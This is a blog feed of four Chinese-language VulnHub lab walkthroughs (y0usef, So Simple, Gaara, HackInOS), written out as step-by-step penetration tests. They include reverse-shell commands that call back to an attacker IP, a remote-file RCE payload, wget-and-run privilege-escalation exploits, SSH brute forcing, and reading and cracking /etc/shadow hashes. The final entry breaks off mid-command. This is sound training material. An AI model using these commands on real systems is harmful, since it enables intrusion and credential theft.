<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>y0usef Walkthrough</title>
      <link href="/2025/03/29/y0usef/"/>
      <url>/2025/03/29/y0usef/</url>
      
        <content type="html"><![CDATA[<h1 id="y0usef-Walkthrough"><a href="#y0usef-Walkthrough" class="headerlink" title="y0usef Walkthrough"></a>y0usef Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：[y0usef: 1](<a href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef: 1 ~ VulnHub</a>)</p><p><img src="/picture/image-20250329154643794.png" alt="image-20250329154643794"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.74</span><br></pre></td></tr></table></figure><p>目标主机开放 22、80 端口</p><p><img src="/picture/image-20250329150831393.png" alt="image-20250329150831393"></p><p>对开放的端口进行应用版本发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.74</span><br></pre></td></tr></table></figure><p>22 端口开放 SSH 服务，80 端口开放 http 服务</p><p><img src="/picture/image-20250329150903703.png" alt="image-20250329150903703"></p><p>先来看 22 端口，尝试弱口令登陆，同时看看能不能泄露机密信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.74</span><br></pre></td></tr></table></figure><p>可惜失败了，再来看 80 端口，进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74</span><br></pre></td></tr></table></figure><p>发现 &#x2F;adminstration 目录</p><p><img src="/picture/image-20250329151251819.png" alt="image-20250329151251819"></p><p>对 &#x2F;adminstration 目录进一步扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.74/adminstration</span><br></pre></td></tr></table></figure><p>发现了很多目录，但是除了 &#x2F;adminstration&#x2F;include&#x2F; 都是 404</p><p><img src="/picture/image-20250329151833451.png" alt="image-20250329151833451"></p><p>访问 &#x2F;adminstration&#x2F;include ，发现两个文件，访问文件没有报错或者禁止访问，但是没有内容</p><p>尝试添加 XFF 头指向 localhost 在进行访问，发现 &#x2F;adminstration 页面变化为登陆界面，弱口令 admin&#x2F;admin 即可进入后台</p><p><img src="/picture/image-20250329152223913.png" alt="image-20250329152223913"></p><p>上传文件，为 MIME 类型检测，将 PHP 木马的 Content-Type 更改为 image&#x2F;jpg 即可上传成功</p><p><img src="/picture/image-20250329152351345.png" alt="image-20250329152351345"></p><p>访问上传的文件 &#x2F;adminstration&#x2F;upload&#x2F;files&#x2F;1668608420php-reverse-shell.php ，同时开启 nc 监听，即可接收到回弹的 shell</p><p><img src="/picture/image-20250329152620389.png" alt="image-20250329152620389"></p><p>获得 TTY shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>查看已登录用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep bash</span><br></pre></td></tr></table></figure><p>切换至 home 目录，查看有哪些用户主目录可以访问，却发现 user.txt</p><p>··<img src="/picture/image-20250329153005316.png" alt="image-20250329153005316"></p><p>查看 user.txt 发现是加密后数据，解密后为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure><p>使用 SSH 远程登陆 yousef 账户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh yousef@172.16.33.74</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250329153710818.png" alt="image-20250329153710818"></p><p>查看有哪些文件具有 SUID 权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现 sudo 竟然有 SUID 权限，由于先前知道 yousef 的 SSH 密码，是否存在密码复用？</p><p><img src="/picture/image-20250329153937600.png" alt="image-20250329153937600"></p><p>尝试使用 sudo 提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/sh</span><br></pre></td></tr></table></figure><p>输入密码 yousef123，竟然成功了</p><p><img src="/picture/image-20250329154038217.png" alt="image-20250329154038217"></p><p>直接获得 flag</p><p><img src="/picture/image-20250329154135436.png" alt="image-20250329154135436"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>So Simple Walkthrough</title>
      <link href="/2025/03/27/SoSimple/"/>
      <url>/2025/03/27/SoSimple/</url>
      
        <content type="html"><![CDATA[<h1 id="So-Simple-Walkthrough"><a href="#So-Simple-Walkthrough" class="headerlink" title="So Simple Walkthrough"></a>So Simple Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/so-simple-1,515/">So Simple: 1</a></p><p><img src="/picture/image-20250329155906591.png" alt="image-20250329155906591"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.71</span><br></pre></td></tr></table></figure><p>目标主机开放 22、80 端口</p><p><img src="/picture/image-20250326153338902.png" alt="image-20250326153338902"></p><p>对开放的端口进行应用版本发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.71</span><br></pre></td></tr></table></figure><p>22 端口开放 SSH 服务，80 端口开放 http 服务</p><p><img src="/picture/image-20250326153509523.png" alt="image-20250326153509523"></p><p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure><p>可惜失败了，目标主机关闭了使用 password 远程登陆，那么暴力破解 SSH 密码也行不通了</p><p><img src="/picture/image-20250326153651400.png" alt="image-20250326153651400"></p><p>那么 22 端口暂时就没有办法了，再来看看 80 端口，先进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.71</span><br></pre></td></tr></table></figure><p>发现目标站点是用 WordPress 搭建的</p><p><img src="/picture/image-20250326153904892.png" alt="image-20250326153904892"></p><p>那就使用 wpscan 对 WordPress 进行扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://172.16.33.71/wordpress -e u,p --api-token &lt;your api token&gt;</span><br></pre></td></tr></table></figure><p>发现了两个插件似乎存在漏洞</p><p><img src="/picture/image-20250326154104736.png" alt="image-20250326154104736"></p><p>看起来 social-warfare 这个 RCE 比较容易利用</p><p><img src="/picture/image-20250326154203969.png" alt="image-20250326154203969"></p><p>在本地 Desktop 创建 payload.txt ，内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;system(&#x27;cat /etc/passwd&#x27;)&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>开启 http 服务，访问如下网址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.33.71/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://10.8.0.90/payload.txt</span><br></pre></td></tr></table></figure><p>利用成功，返回 &#x2F;etc&#x2F;passwd</p><p><img src="/picture/image-20250326154638689.png" alt="image-20250326154638689"></p><p>更改 payload.txt ，写入反弹 shell 代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;system(&#x27;busybox nc 10.8.0.90 1234 -e /bin/bash&#x27;)&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>本机开启监听，再次访问，突破边界成功</p><p><img src="/picture/image-20250326154918472.png" alt="image-20250326154918472"></p><p>升级终端为 TTY shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>在 &#x2F;var&#x2F;www&#x2F;html 下找到第一个 flag</p><p><img src="/picture/image-20250326155143141.png" alt="image-20250326155143141"></p><p>接下来是提权，在 &#x2F;home 会发现两个账户 max 和 steven</p><p>在 &#x2F;home&#x2F;max 目录中，会发现三个比较有意思的文件</p><p><img src="/picture/image-20250326160455389.png" alt="image-20250326160455389"></p><p>但是三个就是幌子，user.txt 不能访问，personal.txt 的密文解密后为 Hahahahaha, it’s not that easy !!! </p><p><img src="/picture/image-20250326160625552.png" alt="image-20250326160625552"></p><p>而 this 文件夹，进入 &#x2F;home&#x2F;max&#x2F;this&#x2F;is&#x2F;maybe&#x2F;the&#x2F;way&#x2F;to&#x2F;a 后会发现也是兔子洞</p><p><img src="/picture/image-20250326160814087.png" alt="image-20250326160814087"></p><p>在 &#x2F;home&#x2F;max&#x2F;.ssh 中发现 SSH 信息泄露</p><p><img src="/picture/image-20250326170024031.png" alt="image-20250326170024031"></p><p>在目标主机开放 http 服务，将 id_rsa 远程下载至本机，同时限制 id_rsa 权限为 600</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">sudo ssh -i id_rsa max@172.16.33.71</span><br></pre></td></tr></table></figure><p>成功远程登陆 max 账号</p><p><img src="/picture/image-20250326184302073.png" alt="image-20250326184302073"></p><p>列出 max 用户在 sudo 权限下可以运行的命令及权限规则</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现 max 可以以 steven 身份通过 sudo 无密码运行 <code>/usr/sbin/service</code></p><p><img src="/picture/image-20250326195123894.png" alt="image-20250326195123894"></p><p>直接将用户切换成 steven </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u steven service ../../bin/bash</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250326200617123.png" alt="image-20250326200617123"></p><p>列出 steven 用户在 sudo 权限下可以运行的命令及权限规则，发现 steven 可以以 root 身份执行 &#x2F;opt&#x2F;tools&#x2F;server-health.sh 文件</p><p><img src="/picture/image-20250326200835294.png" alt="image-20250326200835294"></p><p>先来看看文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/tools/server-health.sh</span><br></pre></td></tr></table></figure><p>文件不存在，看来要自己创建</p><p><img src="/picture/image-20250326201109289.png" alt="image-20250326201109289"></p><p>先创建目录后创建文件，后将反弹 shell 的内容写入文件并赋予可执行权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steven@so-simple:/home/steven$ <span class="built_in">mkdir</span> /opt/tools</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">touch</span> /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">echo</span> <span class="string">&quot;busybox nc 10.8.0.90 8023 -e /bin/bash&quot;</span> &gt;&gt; /opt/tools/server-health.sh</span><br><span class="line">steven@so-simple:/home/steven$ <span class="built_in">chmod</span> +x /opt/tools/server-health.sh</span><br></pre></td></tr></table></figure><p>宿主机开启 nc 监听，目标主机执行 &#x2F;opt&#x2F;tools&#x2F;server-health.sh 命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标主机</span></span><br><span class="line">steven@so-simple:/opt/tools$ sudo /opt/tools/server-health.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 宿主机</span></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8023</span><br></pre></td></tr></table></figure><p>成功获得 root 权限</p><p><img src="/picture/image-20250326201736991.png" alt="image-20250326201736991"></p><p>当然，也可以内核漏洞提权</p><p>查看版本信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p>发现版本为 Ubuntu 20.04 LTS ，可以使用内核漏洞 CVE-2021-3493 提权</p><p><img src="/picture/image-20250326163424002-1742978113370-7.png" alt="image-20250326163424002"></p><p>切换至 &#x2F;tmp 目录，从本机下载 exp ，赋予可执行权限并执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90:8888/exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p>提权成功</p><p><img src="/picture/image-20250326163707896.png" alt="image-20250326163707896"></p><p>获得 flag</p><p><img src="/picture/image-20250326163759981.png" alt="image-20250326163759981"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackInOS Walkthrough</title>
      <link href="/2025/03/26/Gaara/"/>
      <url>/2025/03/26/Gaara/</url>
      
        <content type="html"><![CDATA[<h1 id="Gaara-Walkthrough"><a href="#Gaara-Walkthrough" class="headerlink" title="Gaara Walkthrough"></a>Gaara Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/gaara-1,629/">Gaara: 1</a></p><p><img src="/picture/image-20250326123110685.png" alt="image-20250326123110685"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机做端口发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.69</span><br></pre></td></tr></table></figure><p>目标主机开放 22、80 端口</p><p><img src="/picture/image-20250326110434275.png" alt="image-20250326110434275"></p><p>对开放的端口进行应用版本发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A -T4 172.16.33.69 </span><br></pre></td></tr></table></figure><p>22 端口开放 SSH 服务，80 端口开放 http 服务</p><p><img src="/picture/image-20250326110603058.png" alt="image-20250326110603058"></p><p>先来看 SSH 服务，尝试弱口令远程登陆，同时看看能不能泄露机密信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.69</span><br></pre></td></tr></table></figure><p>可惜失败了</p><p><img src="/picture/image-20250326110715391.png" alt="image-20250326110715391"></p><p>那么暂时就拿 22 端口没办法了，再来看看 80 端口，进行目录发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69</span><br></pre></td></tr></table></figure><p>呃，一个都没扫描的？</p><p><img src="/picture/image-20250326111411455.png" alt="image-20250326111411455"></p><p>直接访问目标站点看看？</p><p>仅为一张图片</p><p><img src="/picture/image-20250326111749132.png" alt="image-20250326111749132"></p><p>但是图片右下角泄露了邮箱，后半段甚至可以是域名</p><p><img src="/picture/image-20250326111812291.png" alt="image-20250326111812291"></p><p>将目标主机 IP 和域名绑定，再次访问试试看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250326111939206.png" alt="image-20250326111939206"></p><p>可惜的是还是不行，看来还有隐藏目录我们没发现，尝试结合字典对目标站点进行目录发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/big.txt</span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">dirsearch -u http://172.16.33.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure><p>幸运的是，找到了 &#x2F;Cryoserver 目录</p><p><img src="/picture/image-20250326111308782.png" alt="image-20250326111308782"></p><p>眼看起来啥也没有，但是我在右边看到了滚动进度条，在进度条最底下看到了额外的三个目录</p><p><img src="/picture/image-20250326112630153.png" alt="image-20250326112630153"></p><p>在 &#x2F;iamgara 里面找到了可疑字符串</p><p><img src="/picture/image-20250326113032549.png" alt="image-20250326113032549"></p><p>CyberChef 没跑出来？有点怪啊</p><p><img src="/picture/image-20250326114624494.png" alt="image-20250326114624494"></p><p>既然网站都是关于 Gaara 的描述，那看看能不能用该用户名爆破 SSH 密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -e nsr -l gaara -P /usr/share/wordlists/rockyou.txt ssh://172.16.33.69</span><br></pre></td></tr></table></figure><p>幸运的是，密码被爆破出来了</p><p><img src="/picture/image-20250326115056046.png" alt="image-20250326115056046"></p><p>直接 SSH 远程登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gaara@172.16.33.69</span><br></pre></td></tr></table></figure><p>成功突破边界</p><p><img src="/picture/image-20250326115157844.png" alt="image-20250326115157844"></p><p>获得 flag.txt</p><p><img src="/picture/image-20250326115555231.png" alt="image-20250326115555231"></p><p>同时发现可疑文件 Kazekage.txt ，内容似乎是 base64 编码，解密出来是一个目录</p><p><img src="/picture/image-20250326115855797.png" alt="image-20250326115855797"></p><p>在目录内发现抽象密文</p><p><img src="/picture/image-20250326120609244.png" alt="image-20250326120609244"></p><p>可通过在线工具 <a href="https://copy.sh/brainfuck/">El Brainfuck</a> 进行解密，看起来是烟雾弹</p><p><img src="/picture/image-20250326120716583.png" alt="image-20250326120716583"></p><p>看看 sudo 版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaara@Gaara:~$ sudo -V</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line">sudo: unable to resolve host Gaara: Temporary failure <span class="keyword">in</span> name resolution</span><br><span class="line">Sudoers policy plugin version 1.8.27</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.27</span><br></pre></td></tr></table></figure><p>看起来可以使用 CVE-2021-3156 提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/exploit_nss.py -O exp.py</span><br><span class="line">chmod +x exp.py</span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><p>成功获得 root 权限</p><p><img src="/picture/image-20250326121834252.png" alt="image-20250326121834252"></p><p>获得 root.txt</p><p><img src="/picture/image-20250326121912200.png" alt="image-20250326121912200"></p><p>当然，在查找哪些文件具有 SUID 权限时，发现了 gdb 文件</p><p><img src="/picture/image-20250326122634005.png" alt="image-20250326122634005"></p><p>直接切换至 &#x2F;usr&#x2F;bin 目录，执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br></pre></td></tr></table></figure><p>可直接提权成功</p><p><img src="/picture/image-20250326122802782.png" alt="image-20250326122802782"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackInOS Walkthrough</title>
      <link href="/2025/03/25/HackInOS/"/>
      <url>/2025/03/25/HackInOS/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOS-Walkthrough"><a href="#HackInOS-Walkthrough" class="headerlink" title="HackInOS Walkthrough"></a>HackInOS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里 <a href="https://www.vulnhub.com/entry/hackinos-1,295/">HackInOS: 1</a></p><p><img src="/picture/image-20250325171754863.png" alt="image-20250325171754863"></p><h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机进行端口发现</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.66</span><br></pre></td></tr></table></figure><p>发现开放 22 和 8000 端口</p><p><img src="/picture/image-20250325103311310.png" alt="image-20250325103311310"></p><p>对开放的端口进行应用版本发现</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,8000 -A -T4 172.16.33.66</span><br></pre></td></tr></table></figure><p>22 端口对应的 SSH 版本较高，漏洞较少且利用较困难，8000 似乎是一个 WordPress 站点，还泄露了 robots.txt</p><p><img src="/picture/image-20250325104528460.png" alt="image-20250325104528460"></p><p>先来看 22 端口，尝试使用弱口令远程登陆 root 账号，同时看有没有泄露机密信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.66</span><br></pre></td></tr></table></figure><p>可惜失败了</p><p><img src="/picture/image-20250325104911673.png" alt="image-20250325104911673"></p><p>看来 22 端口我们暂时拿他没办法了，那么就来看看 8000 端口吧</p><p>访问 robots.txt 中的 &#x2F;upload.php 目录，发现可以上传文件，有意思的是，无论传 PHP 文件还是图片，页面响应都为 <code>:)</code> </p><p><img src="/picture/image-20250325105345399.png" alt="image-20250325105345399"></p><p><img src="/picture/image-20250325105428542.png" alt="image-20250325105428542"></p><p>那我们去 &#x2F;uploads 目录看看有没有上传成功？阿哲…</p><p><img src="/picture/image-20250325105649877.png" alt="image-20250325105649877"></p><p>再看看源码，发现 Hint 指向一个网址 <a href="https://github.com/fatihhcelik/Vulnerable-Machine">https://github.com/fatihhcelik/Vulnerable-Machine</a></p><blockquote><p>年代太久远了，已经是 404 了，只能去别人的 wp 里找源码了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; style=&quot;border: solid;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// Check if image file is a actual image or fake image</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">$rand_number = rand(1,100);</span><br><span class="line">$target_dir = &quot;uploads/&quot;;</span><br><span class="line">$target_file = $target_dir . md5(basename($_FILES[&quot;file&quot;][&quot;name&quot;].$rand_number));</span><br><span class="line">$file_name = $target_dir . basename($_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">$uploadOk = 1;</span><br><span class="line">$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">$type = $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">$check = getimagesize($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">if($check[&quot;mime&quot;] == &quot;image/png&quot; || $check[&quot;mime&quot;] == &quot;image/gif&quot;)&#123;</span><br><span class="line">$uploadOk = 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$uploadOk = 0;</span><br><span class="line">echo &quot;:)&quot;;</span><br><span class="line">&#125; </span><br><span class="line">  if($uploadOk == 1)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file.&quot;.&quot;.$imageFileType);</span><br><span class="line">      echo &quot;File uploaded /uploads/?&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这段代码时 mime 类型检测和文件 md5 加密，同时不显示上传的目录</p><p>制作图片木马</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> php-reverse-shell.php &gt;&gt; picture.png</span><br><span class="line"><span class="built_in">mv</span> picture.png shell.php</span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/picture/image-20250325151128807.png" alt="image-20250325151128807"></p><p>编写脚本生成 shell.php 的所有可能 MD5 文件名并保存在文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_username_dict</span>():</span><br><span class="line">    usernames = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> rand_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">        combined = filename + <span class="built_in">str</span>(rand_num)</span><br><span class="line">        md5_hash = hashlib.md5(combined.encode()).hexdigest()</span><br><span class="line">        full_filename = md5_hash + <span class="string">&quot;.php&quot;</span></span><br><span class="line">        usernames.add(full_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            f.write(username + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Generated <span class="subst">&#123;<span class="built_in">len</span>(usernames)&#125;</span> possible filenames in &#x27;dict.txt&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_username_dict()</span><br></pre></td></tr></table></figure><p>使用生成的字典文件爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://172.16.33.66:8000/uploads dict.txt</span><br></pre></td></tr></table></figure><p>找到上传的文件</p><p><img src="/picture/image-20250325162657576.png" alt="image-20250325162657576"></p><p>开启 nc 监听，访问上传的文件，成功 getshell 并获得 TTY shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="/picture/image-20250325162854964.png" alt="image-20250325162854964"></p><p>接下来是提权，查看有什么文件具有 SUID 权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现 tail 具有 SUID 权限，tail 和 cat 相似，可以读取文件内容</p><p><img src="/picture/image-20250325163046781.png" alt="image-20250325163046781"></p><p>那就直接读取 &#x2F;etc&#x2F;shadow 中的 root 的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -n 100 /etc/shadow</span><br></pre></td></tr></table></figure><p>获得 root 密码</p><p><img src="/picture/image-20250325163534817.png" alt="image-20250325163534817"></p><p>将密码保存为 hash 文件并使用 john 破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi hash</span><br><span class="line">john hash </span><br></pre></td></tr></table></figure><p>破解成功，密码为 john</p><p><img src="/picture/image-20250325163843081.png" alt="image-20250325163843081"></p><p>直接使用 su 提权，成功</p><p><img src="/picture/image-20250325163931780.png" alt="image-20250325163931780"></p><p>这 flag 感觉不太对啊</p><p><img src="/picture/image-20250325164044018.png" alt="image-20250325164044018"></p><p>提示我们注意细节，我们还有 22 端口 SSH 服务没用到，同时 WordPress 站点有大量的 MySQL 服务也没发掘</p><p>查看 WordPress 配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/html/wp-config.php</span><br></pre></td></tr></table></figure><p>找到了 WordPress 账号和密码</p><p><img src="/picture/image-20250325164440356.png" alt="image-20250325164440356"></p><p>由于目标主机没有开放 3306 端口，外部访问不了，尝试在回弹的 shell 中登陆 mysql </p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h db -u wordpress -p wordpress</span><br></pre></td></tr></table></figure><p>成功进入数据库，查看列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; show tables;</span><br></pre></td></tr></table></figure><p>发现第一个列表有 SSH 关键词，能和之前我们猜想的一样</p><p><img src="/picture/image-20250325165014712.png" alt="image-20250325165014712"></p><p>尝试读取其中内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br></pre></td></tr></table></figure><p>发现账户名和密码</p><p><img src="/picture/image-20250325165133622.png" alt="image-20250325165133622"></p><p>使用 hashcat 破解加密后的密码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 e10adc3949ba59abbe56e057f20f883e /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>密码为 123456</p><p><img src="/picture/image-20250325165603369.png" alt="image-20250325165603369"></p><p>由于目标主机开放 22 端口，使用 SSH 远程登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh 